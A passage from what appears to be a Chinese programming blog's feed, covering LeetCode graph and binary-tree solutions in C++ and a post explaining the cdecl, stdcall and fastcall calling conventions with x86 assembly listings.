&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="built_in">size</span>() &lt; numCourses) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：拓扑排序也可以被看成是广度优先搜索的一种情况：我们先遍历一遍所有节点，把入度为0的节点(即没有前置课程要求)放在队列中。在每次从队列中获得节点时，我们将该节点放在目前排序的末尾，并且把它指向的课程的入度各减1；如果在这个过程中有课程的所有前置必修课都已修完(即入度为0)，我们把这个节点加入队列中。当队列的节点都被处理完时，说明所有的节点都已排好序，或因图中存在循环而无法上完所有课程。</p></li></ul><h2 id="三、练习"><a href="#三、练习" class="headerlink" title="三、练习"></a>三、练习</h2><ul><li><p>因为LeetCode要会员以及图论相关的题本就不多的原因，这里的图论算法只涉及到Dijkstra无负边单源最短路算法。还有Kruskal’s Algorithm和Prim’s Algorithm最小生成树算法，最小流算法，Bellman-Ford单源最短路算法以及Floyd-Warshall算法等需要掌握。</p></li><li><p>题目：<a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph">细分图中的可到达节点</a><br>给你一个无向图(原始图)，图中有n个节点，编号从0到n-1。你决定将图中的每条边细分为一条节点链，每条边之间的新节点数各不相同。要细分边[ui, vi]，需要将其替换为(cnti + 1) 条新边，和cnti个新节点。新节点为x1,x2,…,xcnti，新边为[ui, x1],[x1, x2],[x2, x3],…,[xcnti-1, xcnti],[xcnti, vi]。<br><img src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/08/01/origfinal.png" alt="示例图"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; <span class="built_in">adjs</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; edge : edges) &#123;</span><br><span class="line">            adjs[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(&#123;edge[<span class="number">1</span>], edge[<span class="number">2</span>] + <span class="number">1</span>&#125;);</span><br><span class="line">            adjs[edge[<span class="number">1</span>]].<span class="built_in">push_back</span>(&#123;edge[<span class="number">0</span>], edge[<span class="number">2</span>] + <span class="number">1</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dist</span><span class="params">(n, __INT_MAX__)</span></span>;</span><br><span class="line">        dist[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, greater&lt;&gt;&gt; pq;</span><br><span class="line">        pq.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>() &amp;&amp; pq.<span class="built_in">top</span>().first &lt; maxMoves) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [dis, u] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (dis &gt; dist[u]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; [v, cnt] : adjs[u]) &#123;</span><br><span class="line">                <span class="type">int</span> newDis = cnt + dis;</span><br><span class="line">                <span class="keyword">if</span> (newDis &lt; dist[v]) &#123;</span><br><span class="line">                    dist[v] = newDis;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(newDis, v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>&amp; dis : dist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dis &lt;= maxMoves) ++sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> x = <span class="built_in">max</span>(maxMoves - dist[edge[<span class="number">0</span>]], <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> y = <span class="built_in">max</span>(maxMoves - dist[edge[<span class="number">1</span>]], <span class="number">0</span>);</span><br><span class="line">            sum += <span class="built_in">min</span>(edge[<span class="number">2</span>], x + y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这里用的是dijkstra算法，但是难点不在这里，而是要想办法处理掉除开最短路径的其他路径以及走完最短路径还能多出来的步数，解决这个问题的话取一条路径的两端并把分别从两端开始能走的最大步数相加与该路径长度作比较即可。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数调用约定: cdecl, stdcall, fastcall</title>
      <link href="/post/99de4889.html"/>
      <url>/post/99de4889.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、cdecl"><a href="#一、cdecl" class="headerlink" title="一、cdecl"></a>一、cdecl</h2><p>cdecl(C declaration，即C声明)是源起C语言的一种调用约定，也是C语言的事实上的标准。</p><p>主要要求如下：</p><ul><li>函数实参在线程栈上按照从右至左的顺序依次压栈。</li><li>函数结果保存在寄存器EAX&#x2F;AX&#x2F;AL中。</li><li>编译后的函数名前缀是一个下划线字符。</li><li><strong>调用者负责从线程栈中弹出实参(即清栈)</strong>。</li></ul><p>例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">    r = func(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// __attribute__((cdecl))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r = a + b;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后会产生如下代码：</p><p><strong>main函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">1    sub  $0x8, esp</span><br><span class="line">2    push $0x2</span><br><span class="line">3    push $0x1</span><br><span class="line">4    call _Z4funcii        ; push eip, jmp _Z4funcii</span><br><span class="line">5    add  $0x10, esp</span><br><span class="line">6    mov  eax, -0xc(ebp)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>func函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">12   push ebp</span><br><span class="line">13   mov  esp, ebp</span><br><span class="line">14   sub  $0x10, esp</span><br><span class="line">15   mov  0x8(ebp), edx</span><br><span class="line">16   mov  0xc(ebp), eax</span><br><span class="line">17   add  edx, eax</span><br><span class="line">18   mov  eax, -0x4(ebp)</span><br><span class="line">19   mov  -0x4(ebp), eax</span><br><span class="line">20   leave                 ; mov ebp, esp; pop ebp</span><br><span class="line">21   ret                   ; pop eip</span><br></pre></td></tr></table></figure><p>可以看到：main函数在调用func函数之前先进行了<code>sub $0x8</code>，这是因为在现代的x86-64架构中，调用函数时需要保持栈的16字节对齐。而最后栈空间的清理也是由调用者main函数的<code>add $0x10</code>来完成</p><h2 id="二、stdcall"><a href="#二、stdcall" class="headerlink" title="二、stdcall"></a>二、stdcall</h2><p>stdcall是由微软创建的调用约定，是Windows API的标准调用约定。非微软的编译器并不总是支持该调用协议。</p><p>stdcall与cdecall各个方面都非常类似，主要有以下不同：</p><ul><li><strong>stdcall是由被调用者来清除参数的栈空间，因为这个特性stdcall也不支持可变参数。</strong></li><li>不仅以下划线为前缀还以@加上参数的字节数作为后缀。</li></ul><p>同样的例子产生的汇编代码如下：</p><p><strong>main函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">1    sub  $0x8, esp</span><br><span class="line">2    push $0x2</span><br><span class="line">3    push $0x1</span><br><span class="line">4    call _Z4funcii        ; push eip, jmp _Z4funcii</span><br><span class="line">5    add  $0x8, esp</span><br><span class="line">6    mov  eax, -0xc(ebp)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>func函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">12   push ebp</span><br><span class="line">13   mov  esp, ebp</span><br><span class="line">14   sub  $0x10, esp</span><br><span class="line">15   mov  0x8(ebp), edx</span><br><span class="line">16   mov  0xc(ebp), eax</span><br><span class="line">17   add  edx, eax</span><br><span class="line">18   mov  eax, -0x4(ebp)</span><br><span class="line">19   mov  -0x4(ebp), eax</span><br><span class="line">20   leave                 ; mov ebp, esp; pop ebp</span><br><span class="line">21   ret  $0x8             ; pop eip; add $0x8, esp</span><br></pre></td></tr></table></figure><p>可以看到：func函数在返回的时候同时也<code>ret $0x8</code>来进行了参数栈空间的清理。</p><h2 id="三、fastcall"><a href="#三、fastcall" class="headerlink" title="三、fastcall"></a>三、fastcall</h2><p>fastcall 是一种注重速度的调用约定，通过寄存器传递参数来提高函数调用效率。</p><p>主要特点如下：</p><ul><li><strong>前两个参数（从左到右）通过寄存器传递</strong>：第一个参数用ECX，第二个参数用EDX。</li><li>剩余的参数(如果有)按照从右到左的顺序压入栈中。</li><li>函数结果保存在寄存器EAX中。</li><li><strong>被调用者负责清栈</strong>（与stdcall相同）。</li><li>编译后的函数名以<code>@</code>为前缀，以<code>@</code>加上参数的字节数作为后缀。</li></ul><p>例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">    r = func(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// __attribute__((fastcall))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r = a + b + c;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后会产生如下代码：</p><p><strong>main函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">1    sub  $0xc, esp</span><br><span class="line">2    push $0x3</span><br><span class="line">3    mov  $0x2, edx</span><br><span class="line">4    mov  $0x1, ecx</span><br><span class="line">5    call _Z4funciii       ; push eip, jmp _Z4funciii</span><br><span class="line">6    add  $0xc, esp</span><br><span class="line">7    mov  eax, -0xc(ebp)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>_Z4funciii函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">13   push ebp</span><br><span class="line">14   mov  esp, ebp</span><br><span class="line">15   sub  $0x18, esp</span><br><span class="line">16   mov  ecx, -0x14(ebp)</span><br><span class="line">17   mov  edx, -0x18(ebp)</span><br><span class="line">18   mov  -0x14(ebp), edx</span><br><span class="line">19   mov  -0x18(ebp), eax</span><br><span class="line">20   add  eax, edx</span><br><span class="line">21   mov  0x8(ebp), eax</span><br><span class="line">22   add  edx, eax</span><br><span class="line">23   mov  eax, -0x4(ebp)</span><br><span class="line">24   mov  -0x4(ebp), eax</span><br><span class="line">25   leave                 ; mov ebp, esp; pop ebp</span><br><span class="line">26   ret  $0x4             ; pop eip; add $0x4, esp</span><br></pre></td></tr></table></figure><p>可以看到：</p><ul><li>main函数将第1个和第2个参数分别放入ecx和edx寄存器，第3个参数通过<code>push $0x3</code>压入栈中。</li><li>因为有1个参数在栈上（4字节），func函数返回时使用<code>ret $0x4</code>清理栈空间。</li><li><code>sub  $0x18</code>貌似是为了快而直接开出的一块空间(包含了对齐，局部变量，参数影子空间等)。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 函数调用 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(十三): 树</title>
      <link href="/post/80805d86.html"/>
      <url>/post/80805d86.html</url>
      
        <content type="html"><![CDATA[<p>数据结构介绍：作为(单)链表的升级版，我们通常接触的树都是二叉树(binary tree)，即每个节点最多有两个子节点；且除非题目说明，默认树中不存在循环结构。</p><ul><li>代码实现：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">nullptr</span>), <span class="built_in">right</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="一、树的递归"><a href="#一、树的递归" class="headerlink" title="一、树的递归"></a>一、树的递归</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree">二叉树的最大深度</a><br>求一个二叉树的最大深度。<br><img src="https://assets.leetcode.com/uploads/2020/11/26/tmp-tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>)</span><br><span class="line">            depth = <span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>)</span><br><span class="line">            depth = <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;right), depth);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单，非常基础。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/balanced-binary-tree">平衡二叉树</a><br>判断一个二叉树是否平衡。树平衡的定义是，对于树上的任意节点，其两侧节点的最大深度的差值不得大于1。<br><img src="https://assets.leetcode.com/uploads/2020/10/06/balance_1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;left), <span class="built_in">maxDepth</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> left = <span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> right = <span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(left - right) &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单，利用之前的深度计算方法来比较一下就行了。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/diameter-of-binary-tree">二叉树的直径</a><br>求一个二叉树的最长直径。直径的定义是二叉树上任意两节点之间的无向距离。<br><img src="https://assets.leetcode.com/uploads/2021/03/06/diamtree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">updateDiameter</span><span class="params">(TreeNode *node, <span class="type">int</span> &amp;diameter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> left = <span class="built_in">updateDiameter</span>(node-&gt;left, diameter);</span><br><span class="line">        <span class="type">int</span> right = <span class="built_in">updateDiameter</span>(node-&gt;right, diameter);</span><br><span class="line">        diameter = <span class="built_in">max</span>(diameter, left + right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> diameter = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">updateDiameter</span>(root, diameter);</span><br><span class="line">        <span class="keyword">return</span> diameter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：最大直径就是左边最大深度+右边最大深度。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/path-sum-iii">路径总和 III</a><br>给定一个整数二叉树，求有多少条路径节点值的和等于给定值。<br><img src="https://assets.leetcode.com/uploads/2021/04/09/pathsum3-1-tree.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calculatePath</span><span class="params">(TreeNode* root, <span class="type">long</span> <span class="type">long</span> targetSum, <span class="type">int</span>&amp; sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetSum == root-&gt;val) ++sum;</span><br><span class="line">        <span class="built_in">calculatePath</span>(root-&gt;left, targetSum - root-&gt;val, sum);</span><br><span class="line">        <span class="built_in">calculatePath</span>(root-&gt;right, targetSum - root-&gt;val, sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pathSum</span><span class="params">(TreeNode* root, <span class="type">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        queue&lt;TreeNode *&gt; tree;</span><br><span class="line">        tree.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!tree.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = tree.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">                TreeNode *node = tree.<span class="built_in">front</span>();</span><br><span class="line">                tree.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">calculatePath</span>(node, (<span class="type">long</span> <span class="type">long</span>) targetSum, sum);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left != <span class="literal">nullptr</span>)</span><br><span class="line">                    tree.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>)</span><br><span class="line">                    tree.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要遍历每个节点作为起点，然后往下遍历所有路径。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/symmetric-tree">对称二叉树</a><br>判断一个二叉树是否对称。<br><img src="https://pic.leetcode.cn/1698026966-JDYPDU-image.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isLeftRightSymmetric</span><span class="params">(TreeNode* left, TreeNode* right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">nullptr</span> &amp;&amp; right == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">nullptr</span> || right == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (left-&gt;val != right-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isLeftRightSymmetric</span>(left-&gt;left, right-&gt;right) &amp;&amp; <span class="built_in">isLeftRightSymmetric</span>(left-&gt;right, right-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">isLeftRightSymmetric</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：主要是要注意遍历顺序，左左对右右，左右对右左。</p></li><li><p>题目六：<a href="https://leetcode.cn/problems/delete-nodes-and-return-forest">删点成林</a><br>给定一个整数二叉树和一些整数，求删掉这些整数对应的节点后，剩余的子树。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/07/05/screen-shot-2019-07-01-at-53836-pm.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 